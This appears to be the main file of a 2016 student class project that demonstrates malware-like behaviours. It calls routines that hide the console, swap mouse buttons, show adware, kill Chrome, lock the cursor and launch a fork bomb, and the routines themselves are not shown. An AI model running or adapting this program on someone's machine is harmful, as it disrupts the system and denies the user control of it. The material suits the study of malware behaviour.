/*Author: Paul Daubman, Cameron Dumont
Class : CSI - 140 - 05
Assignment : Final
Date Assigned : 11/25/2016
Due Date : 12/9/2016 11:59pm
Description : This program contains a number of small actions common malware uses. These actions are currently not malicious in nature but can be changed at any time.
Certification of Authenticity :
I certify that this is entirely my own work, except where I have given fully 
	- documented references to the work of others.

I understand the definition and consequences of plagiarism and acknowledge that the assessor of this assignment may, for the purpose of assessing this assignment : 
	-Reproduce this assignment and provide a copy to another member of academic staff; and / or
	-Communicate a copy of this assignment to a plagiarism checking service(which may then retain a copy of this assignment on its database for the purpose of future plagiarism checking)

**The entire project was completed from start to finish by both of us working at the same time. There was no split of code.**
*/

#include"header.h"

int  main()
{
	string message = "This is an autotyper. An example of this being used is a piece of malware that automatically runs a specified command to open a backdoor on a system.\n\n";
	autoType(message, 30); //Autotyping function call
	Sleep(5000); //This function pauses the system for 5 seconds before continuing the program
	FreeConsole(); //This function hides the console
	ButtonSwitch(); //Mouse button function call
	Adware(); //Adware function call
	CommandLine(); //Command line function call (ping) and (terminates chrome)
	CursorLock(); //Cursor locking function call
	ForkBomb(); //Fork bomb function call

	return 0;
}